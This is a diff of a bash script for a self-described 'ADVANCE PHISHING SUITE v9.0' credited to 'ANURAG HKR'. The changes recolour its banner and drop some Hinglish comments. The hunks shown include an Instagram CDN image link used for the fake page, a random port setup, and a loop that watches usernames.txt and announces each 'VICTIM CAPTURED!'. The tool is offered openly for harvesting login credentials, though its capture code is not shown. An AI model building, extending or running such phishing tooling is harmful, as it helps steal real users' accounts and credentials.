@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # --- 1. CONFIGURATION (CUSTOM IMAGE) ---
-# Yahan apni image ka link dalo jo mobile me dikhani hai
 IMG_URL="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"
 
 # --- 2. SYSTEM CHECK & SETUP ---
@@ -36,23 +35,24 @@ else
 fi
 
 # RANDOM PORT GENERATOR (The Fix)
-# 4000 se 9000 ke beech random port milega. Error kabhi nahi aayega.
 PORT=$((4000 + RANDOM % 5000))
 
-# --- 3. ADVANCE BANNER (ANURAG HKR) ---
+# --- 3. ADVANCE BANNER (ANURAG HKR - RED EDITION) ---
 clear
-echo -e "${CYAN}"
+# Yahan color ko RED kar diya hai taaki naam Lal dikhe
+echo -e "${RED}"
 cat << "EOF"
-    _    _   _ _   _ ____      _    ____    _   _ _  _______ 
-   / \  | \ | | | | |  _ \    / \  / ___|  | | | | |/ /  _ \ 
-  / _ \ |  \| | | | | |_) |  / _ \| |  _   | |_| | ' /| |_) |
- / ___ \| |\  | |_| |  _ <  / ___ \ |_| |  |  _  | . \|  _ < 
+    _    _   _ _   _ ____       _    ____    _   _ _   _______ 
+   / \  | \ | | | | |  _ \     / \  / ___|  | | | | |/ /  _ \ 
+  / _ \ |  \| | | | | |_) |   / _ \| |  _    | |_| | ' /| |_) |
+ / ___ \| |\  | |_| |  _ <   / ___ \ |_| |  |  _  | . \|  _ < 
 /_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
-                                                             
+                                                              
 EOF
 echo -e "${RESET}"
-echo -e "${PURPLE}      >>> ADVANCE PHISHING SUITE v9.0 <<<       ${RESET}"
-echo -e "${YELLOW}      >>>  CREATED BY : ANURAG HKR    <<<       ${RESET}"
+echo -e "${PURPLE}      >>> ADVANCE PHISHING SUITE v9.0 <<<        ${RESET}"
+# Yahan bhi naam ko RED highlight kiya hai
+echo -e "${YELLOW}      >>>  CREATED BY : ${RED}ANURAG HKR${YELLOW}    <<<        ${RESET}"
 echo -e "${CYAN}====================================================${RESET}"
 echo -e "${GREEN}[+] System Assigned Port : ${RED}$PORT ${GREEN}(Safe Mode)${RESET}"
 echo ""
@@ -193,7 +193,7 @@ while true; do
     if [ -f usernames.txt ]; then
         tail -n 0 -f usernames.txt | while read line; do
             echo -e "${RED}╔════════════════════════════════╗${RESET}"
-            echo -e "${RED}║      VICTIM CAPTURED!          ║${RESET}"
+            echo -e "${RED}║       VICTIM CAPTURED!         ║${RESET}"
             echo -e "${RED}╠════════════════════════════════╣${RESET}"
             echo -e "${GREEN} $line ${RESET}"
             echo -e "${RED}╚════════════════════════════════╝${RESET}"
